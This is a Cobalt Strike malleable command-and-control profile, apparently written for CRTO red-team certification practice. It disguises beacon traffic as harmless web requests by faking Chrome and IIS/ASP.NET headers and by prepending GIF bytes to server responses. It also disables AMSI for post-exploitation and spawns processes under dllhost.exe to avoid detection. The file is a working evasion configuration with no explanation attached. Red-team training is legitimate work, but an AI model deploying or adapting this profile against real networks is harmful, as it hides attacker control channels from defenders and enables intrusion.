# Custom C2 Profile for CRTO
set sample_name "Dumbledore";
set sleeptime "5000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "true";

post-ex {
        set amsi_disable "true";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
}

http-get {
	set uri "/cat.gif /image /pixel.gif /logo.gif";

	client {
        	# customize client indicatorsi
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";

		parameter "utm" "ISO-8898-1";
		parameter "utc" "en-US";

		metadata{
			base64;
			header "Cookie";
		}
	}

	server {
		# customize soerver indicators
		header "Content-Type" "image/gif";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	



		output{
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

http-post {
	set uri "/submit.aspx /finish.aspx";

	client {

		header "Content-Type" "application/octet-stream";
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";
		
		id{
			parameter "id";
		}

		output{
			print;
		}

	}


	server {
		# customize soerver indicators
		header "Content-Type" "text/plain";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			print;
		}
	}
}

http-stager {

	server {
		header "Content-Type" "application/octet-stream";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	
	}
}
